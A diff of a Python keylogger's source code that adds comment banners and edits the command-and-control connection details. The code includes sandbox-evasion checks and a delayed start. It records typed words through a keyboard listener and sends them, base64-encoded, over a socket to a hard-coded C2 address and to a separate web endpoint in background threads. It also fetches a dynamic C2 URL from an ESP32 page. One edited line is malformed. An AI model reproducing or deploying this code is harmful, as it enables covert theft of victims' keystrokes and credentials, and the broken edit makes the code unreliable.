@@ -20,14 +20,23 @@ esp_page = ""  # Optional fallback C2 redirect
 current_word = ""
 buffer = []
 
-port = 5678
+
+
+####################################################
+#This sit the CNC infomation connection details can be dynamnic if needed but hard coded atm
+####################################################
+port = 567
 cnc_num = "192.168.0.105"
-
-#test
+####################################################
+####################################################
+#//////////////////////////////////////////////////////////
+#socket connection to the Cnc
 cnh = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-cnh.connect((cnc_num, port))
+cnh.connect((cnc_num, port)).s
+#///////////////////////////////////////////////////////////
 
-
+##########################################
+##########################################
 def evade_sandbox():
     try:
         if time.time() - psutil.boot_time() < 180:
@@ -39,8 +48,12 @@ def evade_sandbox():
             exit()
     except:
         exit()
-    time.sleep(random.randint(15, 60))  # Delayed start
-
+    time.sleep(random.randint(15, 60))  
+    
+    # Delayed start
+########################################
+#########################################
+#This is going to be talking to an esp32 websever to grap a dynamic c2 url
 def get_dynamic_url():
     if not esp_page:
         return None
@@ -51,13 +64,24 @@ def get_dynamic_url():
             return m.group(1).strip()
     except:
         return None
-
+###########################################
+###########################################
 def  file_browers():
     pass
+###########################################
+###########################################
+
+############################################
+############################################
 #Going to try base64 encoded datainsted 
 def hhhhh(data):
     return base64.b64encode(data.encode("utf-8")).decode("ascii")  # string 
+###########################################
+###########################################
 
+###########################################
+###########################################
+#collects keys until space and or enter is hit them creates a whole word
 def on_press(key):
     global current_word
     try:
@@ -74,15 +98,28 @@ def on_press(key):
         return
     if ch and len(ch) == 1:
         current_word += ch
+############################################
+############################################
 
+############################################
+############################################
 def on_release(key):
     if key == keyboard.Key.esc:
         return False
+############################################
+############################################
 
+
+############################################
+############################################
 def write_word(word, how):
     entry = f"Word completed with {how}: {word}"
     buffer.append(entry)
+##############################################
+##############################################
 
+##############################################
+##############################################
 def send_buffer_dis(url):
     if not buffer:
         return
@@ -99,7 +136,8 @@ def send_buffer_dis(url):
         print("Server replied:", r.status_code)  # for debug only
     except Exception as e:
         print("Send failed:", e)  # for debug only
-
+#############################################
+#############################################
 def send_buffer_2c(url):
     f_id = "Keylog"
     if not buffer:
@@ -109,35 +147,57 @@ def send_buffer_2c(url):
     data_raw = {"Content": encrypted_payload, "id":f_id}
     try:
         data = json.dumps(data_raw).encode("utf-8")
-        cnh.sendall(data + b"\n")
+        cnh.sendall(data + b"\n")#### sneding the infomatoin to the CNC 
     except Exception as e:
         print("Send Failed:", e)
+###########################################
+###########################################
 
+
+###########################################
+###########################################
 def  sys_info():
     compturename = socket.gethostname()
     username = gt.getuser( )
     print(f"Hostname:", compturename,username)
     #homename = platform.node( )
+###########################################
+###########################################
 
+
+###########################################
+###########################################
 # === BACKGROUND EXFIL THREAD ===
 def sender_loop_dis(url):
     while True:
         send_buffer_dis(url)
         delay = random.randint(10, 60)
         time.sleep(delay)
+##########################################
+##########################################        
         
+##########################################
+##########################################
 def sender_loop_2c(url):
     while True:
         send_buffer_2c(url)
         delay = random.randint(10, 60)
         time.sleep(delay)
+#########################################
+#########################################
 
+#########################################
+#########################################
 # === LISTENER WRAPPER ===
 def start():
     listener = keyboard.Listener(on_press=on_press, on_release=on_release)
     listener.start()
     listener.join()
+########################################
+########################################
 
+########################################
+########################################
 # === MAIN ===
 if __name__ == "__main__":
     evade_sandbox()
